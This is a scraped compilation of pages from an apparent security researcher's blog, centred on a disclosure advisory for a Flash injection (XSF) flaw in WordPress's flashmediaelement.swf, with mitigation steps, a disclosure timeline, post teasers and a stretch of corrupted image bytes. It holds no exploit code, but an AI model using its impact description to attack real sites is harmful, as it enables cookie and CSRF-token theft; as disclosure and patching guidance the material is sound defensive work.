* ![](https://secure.gravatar.com/avatar/4e61542961bb8308fd47f926f927766e?s=60&d=mm&r=g) Andy Thompson says:
  [October 13, 2017 at 10:39 am](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comment-121)

  Sorry the link I gave wasn‚Äôt technically correct, it‚Äôs this commit in WordPress/WordPress master branch <https://github.com/WordPress/WordPress/commit/7af3b927362c619752eedd3f9cf209cdaefa0eca>

  + ![](https://secure.gravatar.com/avatar/4e61542961bb8308fd47f926f927766e?s=60&d=mm&r=g) Andy Thompson says:
    [October 13, 2017 at 10:40 am](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comment-122)

    committed to master branch August 1st

Comments are closed.

Search for:

## Recent Posts

* [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)
* [Into the Borg ‚Äì SSRF inside Google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)
* [Stored XSS on Facebook](https://opnsec.com/2018/03/stored-xss-on-facebook/)
* [FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)
* [[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)
## Recent Comments

* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-48064)
* vahhitiu on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-47020)
* Just a nOob on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46910)
* Nani on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46019)
* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-45513)

# Footer Menu

* [Top](#page "Back to top of page")
* [Home](https://opnsec.com "Home")

¬© 2025 [OpnSec](https://opnsec.com/). Theme by [XtremelySocial](http://xtremelysocial.com/wordpress/flat/).



=== Content from opnsec.com_51be60ad_20250126_034118.html ===

# [OpnSec](https://opnsec.com/)

## Open mind Security and Crypto!

## Primary Menu

[Skip to content](#content)
[OpnSec](https://opnsec.com/)

* [About Me](https://opnsec.com/about-me/ "About Me")

# [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)

May 3, 2020

¬†|

[8 Comments](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comments)

How to use browser features to help find DOM XSS. The invisible Messages of Gmail Last year, I looked for DOM XSS in Gmail website. Instead of using url params or the emails themselves as the source of the attack, I decided to use the much more discreet yet ubiquitous postMessage api.¬† At first glance,‚Ä¶ [Read More](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)

---

# [Into the Borg ‚Äì SSRF inside Google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)

July 20, 2018

¬†|

[7 Comments](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/#comments)

Intro ‚Äì Testing Google Sites and Google Caja In March 2018, I reported an XSS in Google Caja, a tool to securely embed arbitrary html/javascript in a webpage. In May 2018, after the XSS was fixed, I realised that Google Sites was using an unpatched version of Google Caja, so I looked if it was‚Ä¶ [Read More](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)

---

# [Stored XSS on Facebook](https://opnsec.com/2018/03/stored-xss-on-facebook/)

March 18, 2018

¬†|

[2 Comments](https://opnsec.com/2018/03/stored-xss-on-facebook/#comments)

tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph. When a user clicks to play the video, the XSS executes on facebook.com Introduction I reported multiple stored XSS on Facebook wall in April 2017.¬†These stored XSS vulnerabilities were also present in WordPress so¬†I waited for WordPress to patch it before‚Ä¶ [Read More](https://opnsec.com/2018/03/stored-xss-on-facebook/)

---

# [FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)

October 19, 2017

¬†|

[3 Comments](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/#comments)

Last week, I disclosed the existence of an unpatched Flash vulnerability on WordPress (https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/). Today, I disclose technical details about this vulnerability. However, contrary to what I announced before, I won‚Äôt provide a POC nor enough technical details to allow attackers to exploit it. Responsible disclosure of unpatched vulnerabilities is never easy, and I‚Äôm trying‚Ä¶ [Read More](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)

---

# [[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)

October 12, 2017

¬†|

[3 Comments](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comments)

Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017 What is the vulnerability ? There is an unpatched vulnerability in latest and older WordPress releases. The vulnerability is a cross-domain Flash injection (XSF), which impact‚Ä¶ [Read More](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)

---

# [Advanced Flash vulnerabilities in Youtube ‚Äì Part 4](https://opnsec.com/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/)

September 13, 2017

¬†|

[4 Comments](https://opnsec.com/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/#comments)

IV. Flash based XSSes on Youtube iframe api I‚Äôm happy that people found my previous posts on Youtube Flash vulnerabilities interesting, and I will keep posting new write-ups. This time I will disclose 3 Flash based XSSes on the new Youtube html5 api (with Flash fallback). Youtube html5 api is called Youtube iframe api, because‚Ä¶ [Read More](https://opnsec.com/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/)

---

# [Advanced Flash Vulnerabilities in Youtube ‚Äì Part 3](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/)

August 30, 2017

III. XSF via loaderinfo.url redefinition Let‚Äôs have a look at how the Main App loads the Modules : The url of the module is dynamically generated by the main app by using it‚Äôs own url (2) and replacing the filename (watch\_as3.swf) by the module filename (subtitles.swf) (3). This allows to handle multiple versions on the‚Ä¶ [Read More](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/)

---

# [Advanced Flash Vulnerabilities in Youtube ‚Äì Part 2](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/)

August 30, 2017

II. XSF via appLoader In Part 1, I introduced an information leakage vulnerability in Youtube. In this part I will disclose a more severe vulnerability that allows arbitrary Flash code execution in youtube.com. This type of vulnerability is very similar to XSS except we execute Flash code instead of Javascript. It is called Cross-Site Flashing‚Ä¶ [Read More](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/)

---

# [Advanced Flash Vulnerabilities in Youtube ‚Äì Part 1](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/)

August 25, 2017

¬†|

[7 Comments](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/#comments)

Why Flash Security still matters? Flash is still an active threat. In 2017, I reported Flash vulnerabilities to Facebook, Youtube, WordPress, Yahoo, Paypal and Stripe. Over the last 3 years, I reported more than 50 Flash vulnerabilities to Bug Bounty programs. And there are many more I didn‚Äôt have the time to report or that‚Ä¶ [Read More](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/)

---

Search for:

## Recent Posts

* [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)
* [Into the Borg ‚Äì SSRF inside Google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)
* [Stored XSS on Facebook](https://opnsec.com/2018/03/stored-xss-on-facebook/)
* [FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)
* [[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)
## Recent Comments

* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-48064)
* vahhitiu on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-47020)
* Just a nOob on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46910)
* Nani on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46019)
* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-45513)

# Footer Menu

* [Top](#page "Back to top of page")
* [Home](https://opnsec.com "Home")

¬© 2025 [OpnSec](https://opnsec.com/). Theme by [XtremelySocial](http://xtremelysocial.com/wordpress/flat/).



=== Content from opnsec.com_039184b0_20250126_034119.html ===

# [OpnSec](https://opnsec.com/)

## Open mind Security and Crypto!

## Primary Menu

[Skip to content](#content)
[OpnSec](https://opnsec.com/)

* [About Me](https://opnsec.com/about-me/ "About Me")

# [CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]

October 12, 2017

¬†|

[3 Comments](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comments)

###

##### **Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017**

### What is the vulnerability ?

There is an **unpatched vulnerability in latest and older WordPress releases**. The vulnerability is a cross-domain Flash injection (**XSF**), which impact is **similar to a Reflected XSS** (or Same-Origin policy bypass).

The vulnerable file is located at /wp-includes/js/mediaelement/**flashmediaelement.swf**.

### Who is affected ?

Any up-to-date or older (for at least 2 years) version of WordPress is vulnerable by default. **Every WordPress website is vulnerable** to this as well as **any other website hosted on the same subdomain** as a WordPress website.

The only WordPress websites that are not affected are those where the vulnerable file, flashmediaelement.swf, is hosted on a sandboxed domain. This is the case for sites hosted on wordpress.com for example.

### What is the impact ?

The impact is similar to an (authenticated) Reflected XSS, except you can‚Äôt manipulate the DOM and read some values like header responses, and the victim must have Flash active. The attacker can send a malicious link that would execute arbitrary Flash code on the WordPress security sandbox. When a victim opens the malicious link, the attacker can perform ‚Äúxhr style‚Äù requests with Flash to any URL in the WordPress domain, using the victim‚Äôs cookies. Attacker can then read the response source code (body) and steal the victims private info including any CSRF token. He can use the CSRF token to perform CSRF actions on behalf of the user. In the case of Facebook for example, this led to Facebook account takeover after the victim clicked on the malicious link.

Because this is a Same-Origin policy bypass, the attacker can exploit this not only on the vulnerable WordPress site but also on any website located in the same subdomain (or same Origin) than the vulnerable WordPress site.

### How to patch this ?

WordPress decided not to patch this issue for some (bad?) reasons. You should simply **remove the vulnerable file** at [WordPress\_Home\_URL]/wp-includes/js/mediaelement/flashmediaelement.swf (which is just a Flash fallback for embed videos not hosted on a streaming website).

Or you can **redirect** [WordPress\_Home\_URL]/wp-includes/js/mediaelement/flashmediaelement.swf **to a sandboxed domain**, for example to https://x0.wp.com/wp-includes/js/mediaelement/flashmediaelement.swf.

Either of these solutions will mitigate this issue.

### What is the timeline of this vulnerability report ?

* Aug 5th **2016**: I reported this issue to Automattic, then WordPress private Bug Bounty program, more than a year ago. WordPress contacted the author of the vulnerable code, mediaelement.js (created by John Dyer @johndyer), which provided a patched file very quickly. WordPress decided not to release the patch.
* Sep 15th 2016: I found that Facebook was using the same vulnerable code, so **facebook.com was vulnerable to the same XSF vulnerability** (similar to a reflected XSS on facebook.com). I reported it to Facebook which fixed it in 5 days.
* Nov 11th 2016: I requested a CVE for this to MITRE and was assigned **CVE-2016-9263**
* Sep 15th **2017**: I informed WordPress Security Team that I was going to publicly disclose CVE-2016-9263
* Oct 12th 2017: I publicly disclose the issue on my blog without any technical detail but with instructions how to patch.
* **Oct 19th 2017: I will publicly disclose technical details** about this vulnerability, including **how to exploit it** [UPDATE]: **Limited technical details** are now available [**here**](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)

### Why are you publicly disclosing this ?

I reported this issue to WordPress more than a year ago, with a working proof of concept, technical details and how to patch the issue. WordPress choose not to release the patch quickly provided by mediaelement.js team. On the other hand, Facebook patched the issue in 5 days. WordPress obviously has less resource than Facebook but this is not a valid excuse because it is the most used Website software in the world, and the patch has been ready for more than a year. They made a poor decision that endangers their users and many websites.

I already reported this vulnerability to large websites like Uber, Spotify, etc‚Ä¶¬† for many of which their main website was vulnerable because of this vulnerability in their WordPress site. Many of them patched it themselves. It is possible that this is now exploited as a consequence of the reports I sent to these organisations. I don‚Äôt accept that the public is not informed about this vulnerability.

**Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017.**

### How can I contact you ?

You can find me on twitter (**@opnsec**). You can also contact me at wordpress /at\ opnsec /dot\ com.

[Tweet](https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F10%2Fcve-2016-9263-unpatched-xsf-vulnerability-in-wordpress%2F&via=opnsec)

[Uncategorized](https://opnsec.com/category/uncategorized/)

## 3 comments on ‚Äú[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]‚Äù

* ![](https://secure.gravatar.com/avatar/4e61542961bb8308fd47f926f927766e?s=60&d=mm&r=g) Andy Thompson says:
  [October 13, 2017 at 10:11 am](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comment-120)

  Does this satisfy your concern that Automattic is continuing to ignore the issue?

  <https://github.com/023yangbo/WordPress/pull/12> ‚Äì merged Sep 3 and presumably will be in the WordPress 4.9 release.
* ![](https://secure.gravatar.com/avatar/4e61542961bb8308fd47f926f927766e?s=60&d=mm&r=g) Andy Thompson says:
  [October 13, 2017 at 10:39 am](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comment-121)

  Sorry the link I gave wasn‚Äôt technically correct, it‚Äôs this commit in WordPress/WordPress master branch <https://github.com/WordPress/WordPress/commit/7af3b927362c619752eedd3f9cf209cdaefa0eca>

  + ![](https://secure.gravatar.com/avatar/4e61542961bb8308fd47f926f927766e?s=60&d=mm&r=g) Andy Thompson says:
    [October 13, 2017 at 10:40 am](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comment-122)

    committed to master branch August 1st

Comments are closed.

Search for:

## Recent Posts

* [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)
* [Into the Borg ‚Äì SSRF inside Google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)
* [Stored XSS on Facebook](https://opnsec.com/2018/03/stored-xss-on-facebook/)
* [FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)
* [[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)
## Recent Comments

* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-48064)
* vahhitiu on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-47020)
* Just a nOob on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46910)
* Nani on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46019)
* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-45513)

# Footer Menu

* [Top](#page "Back to top of page")
* [Home](https://opnsec.com "Home")

¬© 2025 [OpnSec](https://opnsec.com/). Theme by [XtremelySocial](http://xtremelysocial.com/wordpress/flat/).



=== Content from opnsec.com_baaab3b2_20250126_034117.html ===

# [OpnSec](https://opnsec.com/)

## Open mind Security and Crypto!

## Primary Menu

[Skip to content](#content)
[OpnSec](https://opnsec.com/)

* [About Me](https://opnsec.com/about-me/ "About Me")

# About Me

Hi, my name is Engue Gillier and I‚Äôm an Information Security Engineer at Facebook, previously Tenable.

As a Bug Hunter I reported hundreds of vulnerabilities to [Google](https://bughunters.google.com/profile/d5d10a3f-794c-42aa-b58e-5df15d657055) (3 years in [0x0A List](https://bughunters.google.com/leaderboard)), Facebook, WordPress, Uber, Paypal and many more. You can find me on [Twitter](https://twitter.com/opnsec), [LinkedIn](https://www.linkedin.com/in/egillier/), [HackerOne](https://hackerone.com/opnsec), [BugCrowd](https://bugcrowd.com/Opnsec) and ‚Ä¶ in London. I‚Äôm specialized in Web Api security and Vulnerability automation and management.

I‚Äôm also passionate about cryptography and wrote a free course in french about [Applied Cryptography](https://openclassrooms.com/fr/courses/1757741-securisez-vos-donnees-avec-la-cryptographie). In this blog I publish technical write-ups for some of my findings, hoping to help the developer and infosec community make the web a safer place!

![](https://opnsec.com/wp-content/uploads/2017/08/Silicon-300x105.jpg)

[Tweet](https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2Fabout-me%2F&via=opnsec)

Search for:

## Recent Posts

* [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)
* [Into the Borg ‚Äì SSRF inside Google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)
* [Stored XSS on Facebook](https://opnsec.com/2018/03/stored-xss-on-facebook/)
* [FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)
* [[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)
## Recent Comments

* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-48064)
* vahhitiu on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-47020)
* Just a nOob on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46910)
* Nani on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46019)
* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-45513)

# Footer Menu

* [Top](#page "Back to top of page")
* [Home](https://opnsec.com "Home")

¬© 2025 [OpnSec](https://opnsec.com/). Theme by [XtremelySocial](http://xtremelysocial.com/wordpress/flat/).



=== Content from secure.gravatar.com_bb098344_20250126_034116.html ===
ÔøΩÔøΩÔøΩÔøΩ JFIF  ` `  ÔøΩÔøΩ ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90
ÔøΩÔøΩ C 



ÔøΩÔøΩ C  

ÔøΩÔøΩ  < <" ÔøΩÔøΩ           
ÔøΩÔøΩ ÔøΩ   } !1AQa"q2ÔøΩÔøΩÔøΩ#BÔøΩÔøΩRÔøΩÔøΩ$3brÔøΩ
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ        
ÔøΩÔøΩ ÔøΩ  w !1AQaq"2ÔøΩBÔøΩÔøΩÔøΩÔøΩ #3RÔøΩbrÔøΩ
$4ÔøΩ%ÔøΩ&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ   ? ÔøΩÔøΩÔøΩÔøΩ~T~T `QÔøΩZÔøΩÔøΩÔøΩÔøΩnÔøΩÔøΩ6ÔøΩ2JÔøΩ"sÔøΩ+ÔøΩm~iÔøΩ7ÔøΩ2IÔøΩLAP~D ÔøΩl
0+ÔøΩÔøΩÔøΩ{ÔøΩ}6szÔøΩ2auƒòÔøΩÔøΩÔøΩÔøΩp$px>ÔøΩ `QÔøΩGÔøΩGÔøΩ@}ÔøΩœΩÔøΩÔøΩÔøΩxHÔøΩGÔøΩÕí(IÔøΩM#w,ÔøΩ?ÔøΩÔøΩÔøΩ+ÔøΩœΩbx7SMSÔøΩZ|ÔøΩrV%ÔøΩÔøΩÔøΩFÔøΩÔøΩÔøΩ[ÔøΩÔøΩPgﬁºS‚ÜëÔøΩÔøΩC,#dwIÔøΩÔøΩC,ÔøΩ5ÔøΩÔøΩWÔøΩ|X‘íÔøΩƒâgpÔøΩÔøΩ#ÔøΩÔøΩI#ÔøΩÔøΩÔøΩﬁåÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ ÄŒèŒèŒªÔøΩ^\_ﬁµÔøΩ⁄ìanFWÔøΩz?]ÔøΩNÔøΩÔøΩÔøΩÔøΩ
/ÔøΩÔøΩzÔøΩÔøΩÔøΩÔøΩÔøΩyÔøΩÔøΩU\_ÔøΩ;ÔøΩﬂ•zÔøΩÔøΩMHÔøΩHÔøΩÔøΩT`\*ÔøΩ ÔøΩÔøΩ@^!ÔøΩÔøΩ$HÔøΩÔøΩxÔøΩ3`{vÔøΩ◊äÔøΩ-JÔøΩÔøΩÔøΩÔøΩhÔøΩcÔøΩ;ÔøΩƒ∏ÔøΩÔøΩ{ÔøΩÔøΩ÷æÔøΩÔøΩ÷πÔøΩxJÔøΩÔøΩ y&ÔøΩÔøΩÔøΩÔøΩÔøΩhÔøΩÔøΩ :?:|ÔøΩIm4ÔøΩ åÔøΩFÔøΩYOPGS?: ?
ÔøΩ¬öBÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ'ÔøΩ?ÔøΩx%ÔøΩK%ÔøΩÔøΩ0 ≥ÔøΩGÔøΩ\_J`Pc⁄å{RQ@ÔøΩj1ÔøΩGÔøΩ% xÔøΩ≈ù%l|CÔøΩ.ÔøΩ=ÔøΩÔøΩÔøΩÔøΩq8ÔøΩÔøΩTÔøΩÔøΩÔøΩ-5ÔøΩÔøΩ+…ÉÔøΩ
ÔøΩ(ÔøΩÔøΩ

=== Content from opnsec.com_b17fca80_20250126_034118.html ===

# [OpnSec](https://opnsec.com/)

## Open mind Security and Crypto!

## Primary Menu

[Skip to content](#content)
[OpnSec](https://opnsec.com/)

* [About Me](https://opnsec.com/about-me/ "About Me")

# [CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]

October 12, 2017

¬†|

[3 Comments](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comments)

###

##### **Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017**

### What is the vulnerability ?

There is an **unpatched vulnerability in latest and older WordPress releases**. The vulnerability is a cross-domain Flash injection (**XSF**), which impact is **similar to a Reflected XSS** (or Same-Origin policy bypass).

The vulnerable file is located at /wp-includes/js/mediaelement/**flashmediaelement.swf**.

### Who is affected ?

Any up-to-date or older (for at least 2 years) version of WordPress is vulnerable by default. **Every WordPress website is vulnerable** to this as well as **any other website hosted on the same subdomain** as a WordPress website.

The only WordPress websites that are not affected are those where the vulnerable file, flashmediaelement.swf, is hosted on a sandboxed domain. This is the case for sites hosted on wordpress.com for example.

### What is the impact ?

The impact is similar to an (authenticated) Reflected XSS, except you can‚Äôt manipulate the DOM and read some values like header responses, and the victim must have Flash active. The attacker can send a malicious link that would execute arbitrary Flash code on the WordPress security sandbox. When a victim opens the malicious link, the attacker can perform ‚Äúxhr style‚Äù requests with Flash to any URL in the WordPress domain, using the victim‚Äôs cookies. Attacker can then read the response source code (body) and steal the victims private info including any CSRF token. He can use the CSRF token to perform CSRF actions on behalf of the user. In the case of Facebook for example, this led to Facebook account takeover after the victim clicked on the malicious link.

Because this is a Same-Origin policy bypass, the attacker can exploit this not only on the vulnerable WordPress site but also on any website located in the same subdomain (or same Origin) than the vulnerable WordPress site.

### How to patch this ?

WordPress decided not to patch this issue for some (bad?) reasons. You should simply **remove the vulnerable file** at [WordPress\_Home\_URL]/wp-includes/js/mediaelement/flashmediaelement.swf (which is just a Flash fallback for embed videos not hosted on a streaming website).

Or you can **redirect** [WordPress\_Home\_URL]/wp-includes/js/mediaelement/flashmediaelement.swf **to a sandboxed domain**, for example to https://x0.wp.com/wp-includes/js/mediaelement/flashmediaelement.swf.

Either of these solutions will mitigate this issue.

### What is the timeline of this vulnerability report ?

* Aug 5th **2016**: I reported this issue to Automattic, then WordPress private Bug Bounty program, more than a year ago. WordPress contacted the author of the vulnerable code, mediaelement.js (created by John Dyer @johndyer), which provided a patched file very quickly. WordPress decided not to release the patch.
* Sep 15th 2016: I found that Facebook was using the same vulnerable code, so **facebook.com was vulnerable to the same XSF vulnerability** (similar to a reflected XSS on facebook.com). I reported it to Facebook which fixed it in 5 days.
* Nov 11th 2016: I requested a CVE for this to MITRE and was assigned **CVE-2016-9263**
* Sep 15th **2017**: I informed WordPress Security Team that I was going to publicly disclose CVE-2016-9263
* Oct 12th 2017: I publicly disclose the issue on my blog without any technical detail but with instructions how to patch.
* **Oct 19th 2017: I will publicly disclose technical details** about this vulnerability, including **how to exploit it** [UPDATE]: **Limited technical details** are now available [**here**](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)

### Why are you publicly disclosing this ?

I reported this issue to WordPress more than a year ago, with a working proof of concept, technical details and how to patch the issue. WordPress choose not to release the patch quickly provided by mediaelement.js team. On the other hand, Facebook patched the issue in 5 days. WordPress obviously has less resource than Facebook but this is not a valid excuse because it is the most used Website software in the world, and the patch has been ready for more than a year. They made a poor decision that endangers their users and many websites.

I already reported this vulnerability to large websites like Uber, Spotify, etc‚Ä¶¬† for many of which their main website was vulnerable because of this vulnerability in their WordPress site. Many of them patched it themselves. It is possible that this is now exploited as a consequence of the reports I sent to these organisations. I don‚Äôt accept that the public is not informed about this vulnerability.

**Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017.**

### How can I contact you ?

You can find me on twitter (**@opnsec**). You can also contact me at wordpress /at\ opnsec /dot\ com.

[Tweet](https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F10%2Fcve-2016-9263-unpatched-xsf-vulnerability-in-wordpress%2F&via=opnsec)

[Uncategorized](https://opnsec.com/category/uncategorized/)

## 3 comments on ‚Äú[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]‚Äù

* ![](https://secure.gravatar.com/avatar/4e61542961bb8308fd47f926f927766e?s=60&d=mm&r=g) Andy Thompson says:
  [October 13, 2017 at 10:11 am](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comment-120)

  Does this satisfy your concern that Automattic is continuing to ignore the issue?

  <https://github.com/023yangbo/WordPress/pull/12> ‚Äì merged Sep 3 and presumably will be in the WordPress 4.9 release.
